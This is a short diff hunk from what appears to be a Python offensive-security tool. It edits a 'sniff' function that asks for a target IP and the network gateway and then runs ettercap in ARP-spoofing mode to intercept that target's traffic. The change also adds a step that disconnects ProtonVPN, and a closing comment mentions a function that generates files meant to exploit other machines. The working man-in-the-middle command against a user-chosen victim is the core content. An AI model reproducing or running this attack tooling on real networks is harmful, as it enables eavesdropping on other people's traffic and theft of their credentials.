@@ -100,8 +100,10 @@ def sniff():
     jay("please input the ip of your target and the gateway of the network your on")
     ip = input("||*IP*||: ")
     gateway = input("||*GATEWAY*||: ")
-    os.system("sudo wireshark &")
-    os.system(f"sudo ettercap -T -S -i wlo1 -M arp:remote /{gateway}// /{ip}//")
+    os.system(f"sudo ettercap -T -o -i wlo1 -M arp:remote /{gateway}// /{ip}//")
+    jay("removing vpn from system")
+    os.system("protonvpn-cli d")
+    jay("vpn has been disconnected")
     pass
 
 # function that generates a file with intent to exploit another machine
